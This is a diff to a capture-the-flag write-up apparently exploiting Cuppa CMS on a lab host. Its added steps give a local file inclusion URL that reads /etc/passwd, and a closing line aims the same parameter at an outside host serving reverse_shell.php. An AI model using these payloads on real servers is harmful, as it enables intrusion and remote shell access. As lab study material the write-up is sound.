@@ -94,6 +94,26 @@ We visit the page /administrator but it seems that we need credentials again:
 
 After this, we tried to use searchsploit for any vulnerabilities:
 
+![](../../img/Pasted%20image%2020220827221033.png)
+
+After searching, we can see that there is a vulnerability that uses local file inclusion for obtaining RCE, thus we tried to perform the LFI first:
+
+![](../../img/Pasted%20image%2020220827221146.png)
+
+For the LFI, we will use this syntax first to check if it really is working:
+
+`http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
+
+Modifying into this:
+
+`http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
+
+Reveals into this:
+
+![](../../img/Pasted%20image%2020220827221323.png)
+
+At this point, we can safely assume that RFI (remote file inclusion) is also possible, and i got stuck in this point.
+
 
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47:8080/reverse_shell.php?
